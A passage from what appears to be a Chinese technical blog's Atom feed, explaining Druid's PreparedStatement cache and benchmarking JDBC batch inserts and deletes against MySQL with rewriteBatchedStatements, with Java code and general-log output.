对应上面配置的开关</span></span><br><span class="line">  <span class="keyword">if</span> (stmt.isPooled() &amp;&amp; holder.isPoolPreparedStatements() &amp;&amp; stmt.exceptionCount == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 放入缓存池子中</span></span><br><span class="line">    holder.getStatementPool().put(stmtHolder);</span><br><span class="line"></span><br><span class="line">    stmt.clearResultSet();</span><br><span class="line">    holder.removeTrace(stmt);</span><br><span class="line"></span><br><span class="line">    stmtHolder.setFetchRowPeak(stmt.getFetchRowPeak());</span><br><span class="line"></span><br><span class="line">    stmt.setClosed(<span class="keyword">true</span>); <span class="comment">// soft set close</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stmt.isPooled() &amp;&amp; holder.isPoolPreparedStatements()) &#123;</span><br><span class="line">    <span class="comment">// the PreparedStatement threw an exception</span></span><br><span class="line">    stmt.clearResultSet();</span><br><span class="line">    holder.removeTrace(stmt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启了PSCache但是这个stmt抛出过异常，直接从缓存中移除</span></span><br><span class="line">    holder.getStatementPool()</span><br><span class="line">      .remove(stmtHolder);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//Connection behind the statement may be in invalid state, which will throw a SQLException.</span></span><br><span class="line">      <span class="comment">//In this case, the exception is desired to be properly handled to remove the unusable connection from the pool.</span></span><br><span class="line">      stmt.closeInternal();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">      <span class="keyword">this</span>.handleException(ex, <span class="keyword">null</span>);</span><br><span class="line">      <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      holder.getDataSource().incrementClosedPreparedStatementCount();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理这个cache的最终是<code>com.alibaba.druid.pool.PreparedStatementPool</code>，内部是用的<code>LinkedHashMap</code>实现的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.alibaba.druid.pool.PreparedStatementPool.LRUCache</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> <span class="keyword">extends</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">PreparedStatementKey</span>, <span class="title">PreparedStatementHolder</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> maxSize)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 最后一个参数true，保证了是按照访问顺序存储的</span></span><br><span class="line">    <span class="comment">// the ordering mode - &lt;tt&gt;true&lt;/tt&gt; for access-order, </span></span><br><span class="line">    <span class="comment">// &lt;tt&gt;false&lt;/tt&gt; for insertion-order</span></span><br><span class="line">    <span class="keyword">super</span>(maxSize, <span class="number">0.75f</span>, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Entry&lt;PreparedStatementKey, PreparedStatementHolder&gt; eldest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> remove = (size() &gt; dataSource.getMaxPoolPreparedStatementPerConnectionSize());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (remove) &#123;</span><br><span class="line">      closeRemovedStatement(eldest.getValue());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> remove;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启了druid的<code>poolPreparedStatements</code>，就不用开启jdbc的相关缓存了; 此外druid还有<code>sharePreparedStatements</code>等特性，后面可以接着研究一波。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="bug问题"><a href="#bug问题" class="headerlink" title="bug问题"></a>bug问题</h3><p>看到一些文章说，这两个参数有bug，专门查了下，大部分是connector的bug，升级即可；server端的bug很少。</p><img src="/2020/05/05/cache-prep-stmts/image-20200504214214243.png"><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDcyMTQyNQ==&amp;mid=2649257737&amp;idx=1&amp;sn=1704e467a71e747ac66dd2588ae2c3e0&amp;chksm=8767a6f7b0102fe146ed7185bb7e7c182f4171b7250b4ae3afeed6656f6301e127b99a8fc024&amp;mpshare=1&amp;scene=1&amp;srcid=05042eGYalgiTMQDhreEiRVD&amp;sharer_sharetime=1588528226758&amp;sharer_shareid=56c8325ce0536d61fe7c36f461094531%23rd" rel="external nofollow noopener noreferrer" target="_blank">聊聊一次与DeadLock的相遇</a></p><p><a href="https://www.cnblogs.com/jiarui-zjb/p/12635971.html" rel="external nofollow noopener noreferrer" target="_blank">三、mysql 报错 Unknown type ‘14 in column 3 of 5 in binary-encoded result set - 爱笑的berg - 博客园</a></p><h3 id="是否需要开启"><a href="#是否需要开启" class="headerlink" title="是否需要开启"></a>是否需要开启</h3><p>在<a href="https://mp.weixin.qq.com/s?__biz=MzIzNjUxMzk2NQ==&amp;mid=2247484886&amp;idx=1&amp;sn=2cd673f89d3add0e4b50cf8b65bcdadb&amp;chksm=e8d7fa14dfa073024507ddce1c8eed19c175d9dcf97b3781b09ec78b4860bec1205b41b8cdbf&amp;mpshare=1&amp;scene=1&amp;srcid=0504sUEKJQ0os3LxdsVFrQ9C&amp;sharer_sharetime=1588527189589&amp;sharer_shareid=56c8325ce0536d61fe7c36f461094531%23rd" rel="external nofollow noopener noreferrer" target="_blank">浅析MySQL JDBC连接配置上的两个误区</a>中对这个问题，有比较好的说明:</p><blockquote><p>综上所述，现在在使用MySQL时（如果版本比较新的话），出于性能考虑，应该在数据库连接池上开启针对PreparedStatement的缓存。如果没有使用连接池，或者所用的连接池不支持PSCache，也可以在JDBC连接上设置cachePrepStmts=true。</p></blockquote><p>当然，加上这些参数之后，还是应该观察下系统的监控，看看是否性能有提升。</p><p>其中提到了<code></code>useConfigs<code>=maxPerformance</code>, 查了下官网：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--  maxPerformance相当于打开了</span><br><span class="line">cachePrepStmts=true</span><br><span class="line">cacheCallableStmts=true</span><br><span class="line">cacheServerConfiguration=true</span><br><span class="line">useLocalSessionState=true</span><br><span class="line">elideSetAutoCommits=true</span><br><span class="line">alwaysSendSetIsolation=false</span><br><span class="line">enableQueryTimeouts=false</span><br></pre></td></tr></table></figure><p>类似的还有：<code>solarisMaxPerformance</code>、<code>fullDebug</code>、<code>coldFusion</code>等，可以在<a href="https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL Connector/J 5.1 Developer Guide :: 5.3 Configuration Properties for Connector/J</a>找到对应的解释。</p><p>另外，HikariCP的wiki里也有一篇<a href="https://github.com/brettwooldridge/HikariCP/wiki/MySQL-Configuration" rel="external nofollow noopener noreferrer" target="_blank">MySQL Configuration · brettwooldridge/HikariCP Wiki</a>, 也是建议开启。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://dev.mysql.com/doc/refman/5.7/en/sql-prepared-statements.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL 5.7 Reference Manual :: 13.5 Prepared Statements</a></li><li><a href="https://www.it610.com/article/4927543.htm" rel="external nofollow noopener noreferrer" target="_blank">PreparedStatement是如何大幅度提高性能的 - it610.com</a></li><li><a href="https://bugs.mysql.com/bug.php?id=24344" rel="external nofollow noopener noreferrer" target="_blank">MySQL Bugs: #24344: useServerPrepStmts impacts time zone calculations</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIzNjUxMzk2NQ==&amp;mid=2247484886&amp;idx=1&amp;sn=2cd673f89d3add0e4b50cf8b65bcdadb&amp;chksm=e8d7fa14dfa073024507ddce1c8eed19c175d9dcf97b3781b09ec78b4860bec1205b41b8cdbf&amp;mpshare=1&amp;scene=1&amp;srcid=0504sUEKJQ0os3LxdsVFrQ9C&amp;sharer_sharetime=1588527189589&amp;sharer_shareid=56c8325ce0536d61fe7c36f461094531%23rd" rel="external nofollow noopener noreferrer" target="_blank">浅析MySQL JDBC连接配置上的两个误区</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDcyMTQyNQ==&amp;mid=2649257737&amp;idx=1&amp;sn=1704e467a71e747ac66dd2588ae2c3e0&amp;chksm=8767a6f7b0102fe146ed7185bb7e7c182f4171b7250b4ae3afeed6656f6301e127b99a8fc024&amp;mpshare=1&amp;scene=1&amp;srcid=05042eGYalgiTMQDhreEiRVD&amp;sharer_sharetime=1588528226758&amp;sharer_shareid=56c8325ce0536d61fe7c36f461094531%23rd" rel="external nofollow noopener noreferrer" target="_blank">聊聊一次与DeadLock的相遇</a></li><li><a href="https://www.cnblogs.com/jiarui-zjb/p/12635971.html" rel="external nofollow noopener noreferrer" target="_blank">三、mysql 报错 Unknown type ‘14 in column 3 of 5 in binary-encoded result set - 爱笑的berg - 博客园</a></li><li><a href="https://www.cnblogs.com/micrari/p/7112781.html" rel="external nofollow noopener noreferrer" target="_blank">预编译语句(Prepared Statements)介绍，以MySQL为例 - 活在夢裡 - 博客园</a></li><li><a href="https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL Connector/J 5.1 Developer Guide :: 5.3 Configuration Properties for Connector/J</a></li><li><a href="https://github.com/alibaba/druid/wiki/DruidDataSource%E9%85%8D%E7%BD%AE%E5%B1%9E%E6%80%A7%E5%88%97%E8%A1%A8" rel="external nofollow noopener noreferrer" target="_blank">DruidDataSource配置属性列表 · alibaba/druid Wiki</a></li><li><a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL Connector/J 8.0 Developer Guide :: 6.3 Configuration Properties</a></li><li><a href="https://github.com/brettwooldridge/HikariCP/wiki/MySQL-Configuration" rel="external nofollow noopener noreferrer" target="_blank">MySQL Configuration · brettwooldridge/HikariCP Wiki</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;PreparedStatement&lt;/code&gt;可以防止sql注入，这个大家都知道；今天来聊聊他对性能的提升。&lt;/p&gt;
&lt;h2 id=&quot;SQL-syntax&quot;&gt;&lt;a href=&quot;#SQL-syntax&quot; class=&quot;headerlink&quot; title=&quot;SQL
      
    
    </summary>
    
      <category term="jdbc" scheme="http://qsli.github.io/categories/jdbc/"/>
    
    
      <category term="cache-prep-stmts" scheme="http://qsli.github.io/tags/cache-prep-stmts/"/>
    
  </entry>
  
  <entry>
    <title>jdbc-batching</title>
    <link href="http://qsli.github.io/2020/05/03/jdbc-batching/"/>
    <id>http://qsli.github.io/2020/05/03/jdbc-batching/</id>
    <published>2020-05-03T07:12:18.000Z</published>
    <updated>2020-05-03T10:40:19.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="批量处理"><a href="#批量处理" class="headerlink" title="批量处理"></a>批量处理</h2><h3 id="批量插入"><a href="#批量插入" class="headerlink" title="批量插入"></a>批量插入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * insert into words (word)  values(?)  -&gt;  stopwatch = 66487</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testBatch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String connectString = <span class="string">"jdbc:mysql://localhost/test?user=root&amp;password=toor&amp;useLocalSessionState=true&amp;useSSL=false"</span>;</span><br><span class="line">        Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">            .newInstance();</span><br><span class="line">        <span class="keyword">try</span> (Connection conn = DriverManager.getConnection(connectString)) &#123;</span><br><span class="line">            <span class="comment">//插入100000条测试代码</span></span><br><span class="line">            Stopwatch stopwatch = Stopwatch.createStarted();</span><br><span class="line">            <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"insert into words (`word`)  VALUES(?)"</span>)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">                    psts.setString(<span class="number">1</span>, <span class="string">"123"</span>);</span><br><span class="line">                    psts.addBatch();</span><br><span class="line">                &#125;</span><br><span class="line">                psts.executeBatch();</span><br><span class="line">                stopwatch.stop();</span><br><span class="line">                System.out.println(<span class="string">"stopwatch = "</span> + stopwatch.elapsed(TimeUnit.MILLISECONDS));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>打开mysql的general log:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'%general%'</span>;</span><br><span class="line">+------------------+---------------------------------------+</span><br><span class="line">| Variable_name    | Value                                 |</span><br><span class="line">+------------------+---------------------------------------+</span><br><span class="line">| general_log      | ON                                    |</span><br><span class="line">| general_log_file | /usr/<span class="built_in">local</span>/var/mysql/qishengdembp.log |</span><br><span class="line">+------------------+---------------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure><p>这里已经是开启的状态，如果没有开启可以设置下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global general_log=1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>上述java代码执行的时候，查看general log:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">2020-05-02T23:41:28.438048Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.438535Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.439123Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.439725Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.440244Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.440827Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.441424Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.441962Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.442464Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.443025Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.443645Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.444439Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.444938Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.445491Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.446027Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.446575Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.447071Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.447608Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.448215Z  154 Queryinsert into words (`word`)  VALUES(<span class="string">'123'</span>)</span><br><span class="line">2020-05-02T23:41:28.453209Z  154 Quit</span><br></pre></td></tr></table></figure><p>对应的抓包：</p><img src="/2020/05/03/jdbc-batching/image-20200503131020833.png"><p>看起来是一个一个发送的，server端也是一个一个执行的。这样并不能提高效率</p><h4 id="rewriteBatchedStatements-true"><a href="#rewriteBatchedStatements-true" class="headerlink" title="rewriteBatchedStatements=true"></a>rewriteBatchedStatements=true</h4><p>jdbc的连接上配置这个参数，重复上面的过程，得到的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stopwatch = 1320</span><br></pre></td></tr></table></figure><p>sql被改写成了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2020-05-03T05:27:17.921856Z  163 Connectroot@localhost on test using TCP/IP</span><br><span class="line">2020-05-03T05:27:17.925632Z  163 Query<span class="comment">/* mysql-connector-java-8.0.16 (Revision: 34cbc6bc61f72836e26327537a432d6db7c77de6) */</span><span class="keyword">SELECT</span>  @@session.auto_increment_increment <span class="keyword">AS</span> auto_increment_increment, @@character_set_client <span class="keyword">AS</span> character_set_client, @@character_set_connection <span class="keyword">AS</span> character_set_connection, @@character_set_results <span class="keyword">AS</span> character_set_results, @@character_set_server <span class="keyword">AS</span> character_set_server, @@collation_server <span class="keyword">AS</span> collation_server, @@collation_connection <span class="keyword">AS</span> collation_connection, @@init_connect <span class="keyword">AS</span> init_connect, @@interactive_timeout <span class="keyword">AS</span> interactive_timeout, @@license <span class="keyword">AS</span> license, @@lower_case_table_names <span class="keyword">AS</span> lower_case_table_names, @@max_allowed_packet <span class="keyword">AS</span> max_allowed_packet, @@net_write_timeout <span class="keyword">AS</span> net_write_timeout, @@performance_schema <span class="keyword">AS</span> performance_schema, @@sql_mode <span class="keyword">AS</span> sql_mode, @@system_time_zone <span class="keyword">AS</span> system_time_zone, @@<span class="keyword">time_zone</span> <span class="keyword">AS</span> <span class="keyword">time_zone</span>, @@transaction_isolation <span class="keyword">AS</span> transaction_isolation, @@wait_timeout <span class="keyword">AS</span> wait_timeout</span><br><span class="line"><span class="number">2020</span><span class="number">-05</span><span class="number">-03</span>T05:<span class="number">27</span>:<span class="number">17.944989</span>Z  <span class="number">163</span> <span class="keyword">Query</span><span class="keyword">SET</span> character_set_results = <span class="literal">NULL</span></span><br><span class="line"><span class="number">2020</span><span class="number">-05</span><span class="number">-03</span>T05:<span class="number">27</span>:<span class="number">18.312174</span>Z  <span class="number">163</span> <span class="keyword">Query</span><span class="keyword">insert</span> <span class="keyword">into</span> words (<span class="string">`word`</span>)  <span class="keyword">VALUES</span>(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>)</span><br><span class="line"><span class="number">2020</span><span class="number">-05</span><span class="number">-03</span>T05:<span class="number">27</span>:<span class="number">19.280437</span>Z  <span class="number">163</span> Quit</span><br></pre></td></tr></table></figure><img src="/2020/05/03/jdbc-batching/image-20200503132913411.png"><p>抓包也只看到了一次请求，这个性能提升有60+倍。</p><h3 id="批量删除"><a href="#批量删除" class="headerlink" title="批量删除"></a>批量删除</h3><p>测试下批量删除会变成什么样子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@SneakyThrows</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDeleteBatch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">    .newInstance();</span><br><span class="line">  <span class="keyword">try</span> (Connection conn = DriverManager.getConnection(connectString)) &#123;</span><br><span class="line">    Stopwatch stopwatch = Stopwatch.createStarted();</span><br><span class="line">    <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        psts.setInt(<span class="number">1</span>, i);</span><br><span class="line">        psts.addBatch();</span><br><span class="line">      &#125;</span><br><span class="line">      psts.executeBatch();</span><br><span class="line">      stopwatch.stop();</span><br><span class="line">      System.out.println(<span class="string">"stopwatch = "</span> + stopwatch.elapsed(TimeUnit.MILLISECONDS));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/05/03/jdbc-batching/image-20200503141225096.png"><p><strong>sql是一起发过去的</strong>， response貌似是逐个返回的，看下general log：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">2020-05-03T06:14:33.457011Z  180 Querydelete from words <span class="built_in">where</span> id = 99980;</span><br><span class="line">2020-05-03T06:14:33.460456Z  180 Querydelete from words <span class="built_in">where</span> id = 99981;</span><br><span class="line">2020-05-03T06:14:33.465265Z  180 Querydelete from words <span class="built_in">where</span> id = 99982;</span><br><span class="line">2020-05-03T06:14:33.466960Z  180 Querydelete from words <span class="built_in">where</span> id = 99983;</span><br><span class="line">2020-05-03T06:14:33.471134Z  180 Querydelete from words <span class="built_in">where</span> id = 99984;</span><br><span class="line">2020-05-03T06:14:33.478481Z  180 Querydelete from words <span class="built_in">where</span> id = 99985;</span><br><span class="line">2020-05-03T06:14:33.482165Z  180 Querydelete from words <span class="built_in">where</span> id = 99986;</span><br><span class="line">2020-05-03T06:14:33.484546Z  180 Querydelete from words <span class="built_in">where</span> id = 99987;</span><br><span class="line">2020-05-03T06:14:33.489019Z  180 Querydelete from words <span class="built_in">where</span> id = 99988;</span><br><span class="line">2020-05-03T06:14:33.492171Z  180 Querydelete from words <span class="built_in">where</span> id = 99989;</span><br><span class="line">2020-05-03T06:14:33.496335Z  180 Querydelete from words <span class="built_in">where</span> id = 99990;</span><br><span class="line">2020-05-03T06:14:33.502214Z  180 Querydelete from words <span class="built_in">where</span> id = 99991;</span><br><span class="line">2020-05-03T06:14:33.504907Z  180 Querydelete from words <span class="built_in">where</span> id = 99992;</span><br><span class="line">2020-05-03T06:14:33.511418Z  180 Querydelete from words <span class="built_in">where</span> id = 99993;</span><br><span class="line">2020-05-03T06:14:33.519557Z  180 Querydelete from words <span class="built_in">where</span> id = 99994;</span><br><span class="line">2020-05-03T06:14:33.524177Z  180 Querydelete from words <span class="built_in">where</span> id = 99995;</span><br><span class="line">2020-05-03T06:14:33.530256Z  180 Querydelete from words <span class="built_in">where</span> id = 99996;</span><br><span class="line">2020-05-03T06:14:33.533451Z  180 Querydelete from words <span class="built_in">where</span> id = 99997;</span><br><span class="line">2020-05-03T06:14:33.536034Z  180 Querydelete from words <span class="built_in">where</span> id = 99998;</span><br><span class="line">2020-05-03T06:14:33.537884Z  180 Querydelete from words <span class="built_in">where</span> id = 99999</span><br><span class="line">2020-05-03T06:14:33.947681Z  180 Quit</span><br></pre></td></tr></table></figure><p>执行是一条一条执行的</p><h3 id="内存占用过大"><a href="#内存占用过大" class="headerlink" title="内存占用过大"></a>内存占用过大</h3><p>如果一直<code>addBatch</code>,内存压力会比较大，可以分批执行下。</p><h2 id="mysql的实现"><a href="#mysql的实现" class="headerlink" title="mysql的实现"></a>mysql的实现</h2><p>在低版本的mysql connector里，有的不会改写成<code>insert into xx () values</code>的形式，感觉是个bug；升级版本之后就可以了。</p><p>mysql-connector-java-8.0.16.jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.mysql.cj.jdbc.ClientPreparedStatement#executeBatchInternal</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  statementBegins();</span><br><span class="line">  clearWarnings();</span><br><span 